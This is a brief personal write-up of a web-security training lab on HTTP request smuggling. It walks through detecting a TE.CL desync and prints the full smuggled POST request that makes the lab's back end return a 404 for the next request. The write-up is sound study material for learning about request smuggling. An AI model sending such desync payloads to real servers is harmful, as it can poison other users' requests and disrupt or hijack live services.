# Practitioner Lab 129: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses

---

This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding.

To solve the lab, smuggle a request to the back-end server, so that a subsequent request for `/` (the web root) triggers a 404 Not Found response.

![Untitled](Practitioner%20Lab%20129%20HTTP%20request%20smuggling,%20confi%20532557f0519a475aa11b7ed5ae066ff8/Untitled.png)

The initial request was invalidated by the first server. 

meaning that it can only be one of two things. 

TECL or TETE 

now i will test the second case to see which one it is but I know for sure that the front end has TE

![Untitled](Practitioner%20Lab%20129%20HTTP%20request%20smuggling,%20confi%20532557f0519a475aa11b7ed5ae066ff8/Untitled%201.png)

Since it gave me a timeout it means that This is TECL 

![Untitled](Practitioner%20Lab%20129%20HTTP%20request%20smuggling,%20confi%20532557f0519a475aa11b7ed5ae066ff8/Untitled%202.png)

I then altered the request to be like this

```
POST / HTTP/1.1
Host: 0aaa006f0408e4948128bd5e00200073.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

58
GET /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

0

```

This sends a good Chuncked request but a cutoff content length. This results in me poisoning the server with part of my 404 request and results in the lab being solved.